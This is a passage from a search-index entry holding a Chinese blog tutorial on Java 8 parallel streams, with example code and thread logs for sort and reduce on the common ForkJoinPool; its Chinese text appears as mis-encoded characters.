[ForkJoinPool.commonPool-worker-2]filter:  a2 [ForkJoinPool.commonPool-worker-1]map:     a2 [ForkJoinPool.commonPool-worker-1]filter:  b1 [main]map:     b1 [main]filter:  a1 [ForkJoinPool.commonPool-worker-2]map:     a1 [ForkJoinPool.commonPool-worker-2]map:     c2 [ForkJoinPool.commonPool-worker-3]sort:    A2 &lt;> A1 [main]sort:    B1 &lt;> A2 [main]sort:    C2 &lt;> B1 [main]sort:    C1 &lt;> C2 [main]sort:    C1 &lt;> B1 [main]sort:    C1 &lt;> C2 [main]forEach: A1 [ForkJoinPool.commonPool-worker-1]forEach: C2 [ForkJoinPool.commonPool-worker-3]forEach: B1 [main]forEach: A2 [ForkJoinPool.commonPool-worker-2]forEach: C1 [ForkJoinPool.commonPool-worker-1]</code></pre><p>æ’åºä¼¼ä¹åªåœ¨ä¸»çº¿ç¨‹ä¸Šé¡ºåºæ‰§è¡Œã€‚å®é™…ä¸Šï¼Œåœ¨å¹¶è¡Œæµä¸Šæ’åºä½¿ç”¨äº†æ–°çš„Java 8æ–¹æ³•<code>Arrays.parallelSort()</code>ã€‚å¦‚Javadocä¸­æ‰€è¿°ï¼Œå¦‚æœæ’åºæ˜¯é¡ºåºæ‰§è¡Œè¿˜æ˜¯å¹¶è¡Œæ‰§è¡Œï¼Œè¯¥æ–¹æ³•å†³å®šæ•°ç»„çš„é•¿åº¦:</p><blockquote><p>å¦‚æœæŒ‡å®šæ•°ç»„çš„é•¿åº¦å°äºæœ€å°ç²’åº¦ï¼Œåˆ™ä½¿ç”¨é€‚å½“çš„<code>Arrays</code>å¯¹å…¶è¿›è¡Œæ’åºã€‚æ’åºæ–¹æ³•ã€‚</p></blockquote><p>å›åˆ°ä¸Šä¸€èŠ‚çš„<code>reduce</code>ç¤ºä¾‹ã€‚æˆ‘ä»¬å·²ç»å‘ç°ï¼Œ<code>combiner</code>å‡½æ•°åªåœ¨å¹¶è¡Œä¸­è°ƒç”¨ï¼Œè€Œä¸æ˜¯åœ¨é¡ºåºæµä¸­è°ƒç”¨ã€‚è®©æˆ‘ä»¬çœ‹çœ‹å“ªäº›çº¿ç¨‹çœŸæ­£æ¶‰åŠ:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Person</span><span class="token punctuation">></span></span> persons <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>    <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"Max"</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"Peter"</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"Pamela"</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"David"</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>persons    <span class="token punctuation">.</span><span class="token function">parallelStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span>sum<span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"accumulator: sum=%s; person=%s [%s]\n"</span><span class="token punctuation">,</span>                sum<span class="token punctuation">,</span> p<span class="token punctuation">,</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> sum <span class="token operator">+=</span> p<span class="token punctuation">.</span>age<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span>sum1<span class="token punctuation">,</span> sum2<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"combiner: sum1=%s; sum2=%s [%s]\n"</span><span class="token punctuation">,</span>                sum1<span class="token punctuation">,</span> sum2<span class="token punctuation">,</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> sum1 <span class="token operator">+</span> sum2<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æ§åˆ¶å°è¾“å‡ºæ˜¾ç¤ºç´¯åŠ å™¨å’Œç»„åˆå™¨å‡½æ•°åœ¨æ‰€æœ‰å¯ç”¨çº¿ç¨‹ä¸Šå¹¶è¡Œæ‰§è¡Œ:</p><pre class="language-text" data-language="text"><code class="language-text">accumulator: sum=0; person=Pamela; [main]accumulator: sum=0; person=Max;    [ForkJoinPool.commonPool-worker-3]accumulator: sum=0; person=David;  [ForkJoinPool.commonPool-worker-2]accumulator: sum=0; person=Peter;  [ForkJoinPool.commonPool-worker-1]combiner:    sum1=18; sum2=23;     [ForkJoinPool.commonPool-worker-1]combiner:    sum1=23; sum2=12;     [ForkJoinPool.commonPool-worker-2]combiner:    sum1=41; sum2=35;     [ForkJoinPool.commonPool-worker-2]</code></pre><p>æ€»ä¹‹ï¼Œå¯ä»¥è¿™æ ·è¯´ï¼Œå¹¶è¡Œæµå¯ä»¥ä¸ºå…·æœ‰å¤§é‡è¾“å…¥å…ƒç´ çš„æµå¸¦æ¥å¾ˆå¥½çš„æ€§èƒ½æå‡ã€‚ä½†æ˜¯è¯·è®°ä½ï¼Œåƒ<code>reduce</code>å’Œ<code>collect</code>è¿™æ ·çš„å¹¶è¡Œæµæ“ä½œéœ€è¦é¢å¤–çš„è®¡ç®—(åˆå¹¶æ“ä½œ)ï¼Œè¿™åœ¨é¡ºåºæ‰§è¡Œæ—¶æ˜¯ä¸éœ€è¦çš„ã€‚</p><p>æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜äº†è§£åˆ°æ‰€æœ‰å¹¶è¡Œæµæ“ä½œå…±äº«åŒä¸€ä¸ªjvmèŒƒå›´çš„å…¬å…±<code>ForkJoinPool</code>ã€‚å› æ­¤ï¼Œæ‚¨å¯èƒ½å¸Œæœ›é¿å…å®ç°ç¼“æ…¢é˜»å¡çš„æµæ“ä½œï¼Œå› ä¸ºè¿™å¯èƒ½ä¼šé™ä½åº”ç”¨ç¨‹åºä¸­ä¸¥é‡ä¾èµ–å¹¶è¡Œæµçš„å…¶ä»–éƒ¨åˆ†çš„é€Ÿåº¦ã€‚</p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> å­¦ä¹ ç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
